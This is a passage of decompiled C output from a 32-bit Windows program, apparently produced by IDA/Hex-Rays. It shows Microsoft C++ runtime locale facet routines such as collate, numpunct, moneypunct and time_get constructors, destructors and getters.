  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_4381FE(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBA8 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBA8: using guessed type int dword_4FFBA8;
// 436823: using guessed type char var_14[4];

//----- (004368B8) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4368B8(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB74;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB74;
  v2 = std::locale::id::operator unsigned int(&unk_4FFAF0);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_438272(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB74 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB74: using guessed type int dword_4FFB74;
// 4368B8: using guessed type char var_14[4];

//----- (0043694D) --------------------------------------------------------
_DWORD *__thiscall sub_43694D(_DWORD *this, void *Src)
{
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  std::wstring::assign(Src);
  return this;
}

//----- (0043699A) --------------------------------------------------------
_DWORD *__thiscall sub_43699A(_DWORD *this, void *a2, int a3)
{
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  sub_404330(this, a2, a3);
  return this;
}

//----- (00436A30) --------------------------------------------------------
_DWORD *__thiscall sub_436A30(_DWORD *this, std::_Locinfo *a2, int a3)
{
  this[1] = a3;
  *this = &std::time_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';
  sub_43C73A(this, a2);
  return this;
}
// 4912D4: using guessed type void *std::time_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';

//----- (00436A63) --------------------------------------------------------
_DWORD *__thiscall sub_436A63(_DWORD *this, std::_Locinfo *a2, int a3)
{
  this[1] = a3;
  *this = &std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';
  std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Init(a2);
  return this;
}
// 491114: using guessed type void *std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';

//----- (00436AB1) --------------------------------------------------------
void __thiscall sub_436AB1(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-8h]

  v2 = (void *)this[3];
  *this = &std::collate<unsigned short>::`vftable';
  free(v2);
  *this = &std::_Facet_base::`vftable';
}
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 4911D0: using guessed type void *std::collate<unsigned short>::`vftable';

//----- (00436ACB) --------------------------------------------------------
void __thiscall sub_436ACB(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-8h]

  v2 = (void *)this[3];
  *this = &std::collate<wchar_t>::`vftable';
  free(v2);
  *this = &std::_Facet_base::`vftable';
}
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 491010: using guessed type void *std::collate<wchar_t>::`vftable';

//----- (00436B37) --------------------------------------------------------
void __thiscall sub_436B37(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-8h]

  v2 = (void *)this[2];
  *this = &std::time_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
  free(v2);
  *this = &std::_Facet_base::`vftable';
}
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 491300: using guessed type void *std::time_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';

//----- (00436B51) --------------------------------------------------------
void __thiscall sub_436B51(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-8h]

  v2 = (void *)this[2];
  *this = &std::time_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
  free(v2);
  *this = &std::_Facet_base::`vftable';
}
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 490F6C: using guessed type void *std::time_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';

//----- (00436D67) --------------------------------------------------------
_DWORD *__thiscall sub_436D67(_DWORD *Block, char a2)
{
  sub_436AB1(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00436D89) --------------------------------------------------------
_DWORD *__thiscall sub_436D89(_DWORD *Block, char a2)
{
  sub_436ACB(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00436DCD) --------------------------------------------------------
void *__thiscall sub_436DCD(void *Block, char a2)
{
  std::ctype<wchar_t>::~ctype<wchar_t>();
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 436B0E: using guessed type int std::ctype<wchar_t>::~ctype<wchar_t>(void);

//----- (00436DEF) --------------------------------------------------------
_DWORD *__thiscall sub_436DEF(_DWORD *Block, char a2)
{
  *Block = &std::numpunct<unsigned short>::`vftable';
  unknown_libname_20();
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 432C73: using guessed type int unknown_libname_20(void);
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 4911AC: using guessed type void *std::numpunct<unsigned short>::`vftable';

//----- (00436E1D) --------------------------------------------------------
_DWORD *__thiscall sub_436E1D(_DWORD *Block, char a2)
{
  *Block = &std::numpunct<wchar_t>::`vftable';
  unknown_libname_20();
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 432C73: using guessed type int unknown_libname_20(void);
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 490FEC: using guessed type void *std::numpunct<wchar_t>::`vftable';

//----- (00436E4B) --------------------------------------------------------
_DWORD *__thiscall sub_436E4B(_DWORD *Block, char a2)
{
  *Block = &std::time_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';
  unknown_libname_61();
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 43E637: using guessed type int unknown_libname_61(void);
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 4912D4: using guessed type void *std::time_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';

//----- (00436E79) --------------------------------------------------------
_DWORD *__thiscall sub_436E79(_DWORD *Block, char a2)
{
  *Block = &std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';
  unknown_libname_61();
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 43E637: using guessed type int unknown_libname_61(void);
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 491114: using guessed type void *std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';

//----- (00436EA7) --------------------------------------------------------
_DWORD *__thiscall sub_436EA7(_DWORD *Block, char a2)
{
  sub_436B37(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00436EC9) --------------------------------------------------------
_DWORD *__thiscall sub_436EC9(_DWORD *Block, char a2)
{
  sub_436B51(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (004377EA) --------------------------------------------------------
int __cdecl sub_4377EA(_Collvec **a1, int a2)
{
  char v2; // bl
  _Collvec *v3; // esi
  const char *v4; // eax
  bool v5; // cf
  void *v7[14]; // [esp+10h] [ebp-68h] BYREF
  int v8; // [esp+48h] [ebp-30h]
  int v9; // [esp+4Ch] [ebp-2Ch]
  _DWORD v10[9]; // [esp+50h] [ebp-28h] BYREF
  int v11; // [esp+74h] [ebp-4h]

  v2 = 0;
  v9 = a2;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = (_Collvec *)operator new(0x10u);
    v7[13] = v3;
    v11 = 0;
    if ( v3 )
    {
      v4 = (const char *)std::locale::name(v10);
      v5 = *((_DWORD *)v4 + 5) < 0x10u;
      LOBYTE(v11) = 1;
      v8 = 1;
      if ( !v5 )
        v4 = *(const char **)v4;
      std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3->_LocaleName = 0;
      v2 = 3;
      v3->_Page = (unsigned int)&std::collate<unsigned short>::`vftable';
      v3[1] = _Getcoll();
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 2) != 0 )
    {
      v2 &= ~2u;
      sub_42DB80(v7);
    }
    if ( (v2 & 1) != 0 )
      sub_409CE0(v10);
  }
  return 1;
}
// 442ED2: using guessed type _DWORD __stdcall std::locale::name(_DWORD);
// 4911D0: using guessed type void *std::collate<unsigned short>::`vftable';
// 4377EA: using guessed type _DWORD var_28[9];

//----- (0043788C) --------------------------------------------------------
int __cdecl sub_43788C(_Collvec **a1, int a2)
{
  char v2; // bl
  _Collvec *v3; // esi
  const char *v4; // eax
  bool v5; // cf
  void *v7[14]; // [esp+10h] [ebp-68h] BYREF
  int v8; // [esp+48h] [ebp-30h]
  int v9; // [esp+4Ch] [ebp-2Ch]
  _DWORD v10[9]; // [esp+50h] [ebp-28h] BYREF
  int v11; // [esp+74h] [ebp-4h]

  v2 = 0;
  v9 = a2;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = (_Collvec *)operator new(0x10u);
    v7[13] = v3;
    v11 = 0;
    if ( v3 )
    {
      v4 = (const char *)std::locale::name(v10);
      v5 = *((_DWORD *)v4 + 5) < 0x10u;
      LOBYTE(v11) = 1;
      v8 = 1;
      if ( !v5 )
        v4 = *(const char **)v4;
      std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3->_LocaleName = 0;
      v2 = 3;
      v3->_Page = (unsigned int)&std::collate<wchar_t>::`vftable';
      v3[1] = _Getcoll();
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 2) != 0 )
    {
      v2 &= ~2u;
      sub_42DB80(v7);
    }
    if ( (v2 & 1) != 0 )
      sub_409CE0(v10);
  }
  return 1;
}
// 442ED2: using guessed type _DWORD __stdcall std::locale::name(_DWORD);
// 491010: using guessed type void *std::collate<wchar_t>::`vftable';
// 43788C: using guessed type _DWORD var_28[9];

//----- (00437A0E) --------------------------------------------------------
int __cdecl sub_437A0E(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::messages<unsigned short>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 6;
}
// 4911EC: using guessed type void *std::messages<unsigned short>::`vftable';

//----- (00437A76) --------------------------------------------------------
int __cdecl sub_437A76(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::messages<wchar_t>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 6;
}
// 49102C: using guessed type void *std::messages<wchar_t>::`vftable';

//----- (00437ADE) --------------------------------------------------------
int __cdecl sub_437ADE(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::money_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 3;
}
// 491208: using guessed type void *std::money_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';

//----- (00437B46) --------------------------------------------------------
int __cdecl sub_437B46(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::money_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 3;
}
// 491048: using guessed type void *std::money_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';

//----- (00437BAE) --------------------------------------------------------
int __cdecl sub_437BAE(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::money_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 3;
}
// 491220: using guessed type void *std::money_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';

//----- (00437C16) --------------------------------------------------------
int __cdecl sub_437C16(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 3;
}
// 491060: using guessed type void *std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';

//----- (00437C7E) --------------------------------------------------------
int __cdecl sub_437C7E(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x58u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::_Mpunct<unsigned short>::`vftable';
      *((_BYTE *)v3 + 40) = 1;
      sub_43C3C1((int)v3, v5, 1);
      *v3 = &std::moneypunct<unsigned short,1>::`vftable';
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 3;
}
// 491238: using guessed type void *std::_Mpunct<unsigned short>::`vftable';
// 4912A0: using guessed type void *std::moneypunct<unsigned short,1>::`vftable';

//----- (00437D02) --------------------------------------------------------
int __cdecl sub_437D02(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x58u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::_Mpunct<unsigned short>::`vftable';
      *((_BYTE *)v3 + 40) = 0;
      sub_43C3C1((int)v3, v5, 1);
      *v3 = &std::moneypunct<unsigned short,0>::`vftable';
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 3;
}
// 491238: using guessed type void *std::_Mpunct<unsigned short>::`vftable';
// 49126C: using guessed type void *std::moneypunct<unsigned short,0>::`vftable';

//----- (00437D87) --------------------------------------------------------
int __cdecl sub_437D87(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x58u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::_Mpunct<wchar_t>::`vftable';
      *((_BYTE *)v3 + 40) = 1;
      sub_43C48C((int)v3, v5, 1);
      *v3 = &std::moneypunct<wchar_t,1>::`vftable';
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 3;
}
// 491078: using guessed type void *std::_Mpunct<wchar_t>::`vftable';
// 4910E0: using guessed type void *std::moneypunct<wchar_t,1>::`vftable';

//----- (00437E0B) --------------------------------------------------------
int __cdecl sub_437E0B(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x58u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::_Mpunct<wchar_t>::`vftable';
      *((_BYTE *)v3 + 40) = 0;
      sub_43C48C((int)v3, v5, 1);
      *v3 = &std::moneypunct<wchar_t,0>::`vftable';
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 3;
}
// 491078: using guessed type void *std::_Mpunct<wchar_t>::`vftable';
// 4910AC: using guessed type void *std::moneypunct<wchar_t,0>::`vftable';

//----- (00437E90) --------------------------------------------------------
int __cdecl sub_437E90(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::num_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 4;
}
// 491140: using guessed type void *std::num_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';

//----- (00437EF8) --------------------------------------------------------
int __cdecl sub_437EF8(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 4;
}
// 490F80: using guessed type void *std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';

//----- (00437F60) --------------------------------------------------------
int __cdecl sub_437F60(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::num_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 4;
}
// 49117C: using guessed type void *std::num_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';

//----- (00437FC8) --------------------------------------------------------
int __cdecl sub_437FC8(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 4;
}
// 490FBC: using guessed type void *std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';

//----- (00438030) --------------------------------------------------------
int __cdecl sub_438030(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x18u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::numpunct<unsigned short>::`vftable';
      std::numpunct<unsigned short>::_Init(v5, 1);
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 4;
}
// 43C590: using guessed type _DWORD __stdcall std::numpunct<unsigned short>::_Init(_DWORD, _DWORD);
// 4911AC: using guessed type void *std::numpunct<unsigned short>::`vftable';

//----- (004380AB) --------------------------------------------------------
int __cdecl sub_4380AB(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x18u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::numpunct<wchar_t>::`vftable';
      std::numpunct<wchar_t>::_Init(v5, 1);
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 4;
}
// 43C669: using guessed type _DWORD __stdcall std::numpunct<wchar_t>::_Init(_DWORD, char);
// 490FEC: using guessed type void *std::numpunct<wchar_t>::`vftable';

//----- (00438126) --------------------------------------------------------
int __cdecl sub_438126(_DWORD *a1, std::locale *a2)
{
  _DWORD *v2; // esi
  char v3; // bl
  const char *v4; // eax
  std::_Locinfo *v5; // eax
  void *v7[13]; // [esp+10h] [ebp-48h] BYREF
  void *Block; // [esp+44h] [ebp-14h]
  int v9; // [esp+48h] [ebp-10h]
  int v10; // [esp+54h] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v9 = 0;
  if ( a1 && !*a1 )
  {
    Block = operator new(0x44u);
    v10 = 0;
    if ( Block )
    {
      v4 = std::locale::c_str(a2);
      v5 = (std::_Locinfo *)std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3 = 1;
      LOBYTE(v10) = 1;
      v9 = 1;
      v2 = sub_436A30(Block, v5, 0);
    }
    *a1 = v2;
    if ( (v3 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 5;
}

//----- (00438192) --------------------------------------------------------
int __cdecl sub_438192(_DWORD *a1, std::locale *a2)
{
  _DWORD *v2; // esi
  char v3; // bl
  const char *v4; // eax
  std::_Locinfo *v5; // eax
  void *v7[13]; // [esp+10h] [ebp-48h] BYREF
  _DWORD *v8; // [esp+44h] [ebp-14h]
  int v9; // [esp+48h] [ebp-10h]
  int v10; // [esp+54h] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v9 = 0;
  if ( a1 && !*a1 )
  {
    v8 = operator new(0x44u);
    v10 = 0;
    if ( v8 )
    {
      v4 = std::locale::c_str(a2);
      v5 = (std::_Locinfo *)std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3 = 1;
      LOBYTE(v10) = 1;
      v9 = 1;
      v2 = sub_436A63(v8, v5, 0);
    }
    *a1 = v2;
    if ( (v3 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 5;
}

//----- (004381FE) --------------------------------------------------------
int __cdecl sub_4381FE(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[13]; // [esp+10h] [ebp-44h] BYREF
  void *Block; // [esp+44h] [ebp-10h]
